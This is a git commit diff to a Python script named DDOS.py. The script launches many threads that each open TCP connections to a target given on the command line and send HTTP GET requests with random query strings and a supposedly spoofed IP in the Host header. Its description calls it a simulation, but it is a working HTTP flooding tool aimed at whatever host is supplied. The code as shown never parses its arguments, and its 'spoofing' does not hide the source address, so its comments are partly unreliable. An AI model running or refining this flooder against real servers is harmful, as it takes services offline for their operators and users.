88350bcb89568b845e380ff2f00380d96c701c56
Ghostwolf73 <solomzigumbo@gmail.com>
2024-11-14 17:19:31 +0200

    improved the script and added some comments for future refs, haven't been tested though

--- DDOS.py
+++ DDOS.py
@@ -1,6 +1,8 @@
 import threading
 import socket
 import argparse
+import random
+import time
 
 # Set up argument parsing, get IP addresses and port numbers from the CLI as the script runs
 parser = argparse.ArgumentParser(description="DDoS attack simulation script.")
@@ -9,20 +11,24 @@ parser.add_argument("port", type=int, help="Target port")
 parser.add_argument("spoofedIP", type=str, help="Spoofed source IP address to include in the request headers")
 parser.add_argument("--threads", type=int, default=100, help="Number of threads to launch (default: 100)")
 
-# connected = 0
-
 def attack():
     while True:
+        #creating a TCP/IP socket
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((target, port))
-        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
-        s.sendto(("Host: " + myIP + "\r\n\r\n").encode('ascii'), (target, port))
+
+        #connecting to the target
+        s.connect((args.target, args.port))
+
+        #sending HTTP GET requests with spooferd IP in headers
+        payload = f"GET /index.html?query={random.randint(1000,9999)} HTTP/1.1\r\n"
+        s.sendto(payload.encode('ascii'), (args.target, args.port))
+        s.sendto((f"Host: {args.spoofedIP}\r\n\r\n").encode('ascii'), (args.target, args.port))
+
+        #close the socket a bit to keep it persistent
+        time.sleep(random.uniform(0.5, 2.0))
         s.close()
-
-#        global connected
-#        connected += 1
-#        print(connected)
-
-for i in range(5000):
+        
+#Launch multiple threads for the attack
+for i in range(args.threads):
     thread = threading.Thread(target=attack)
     thread.start()
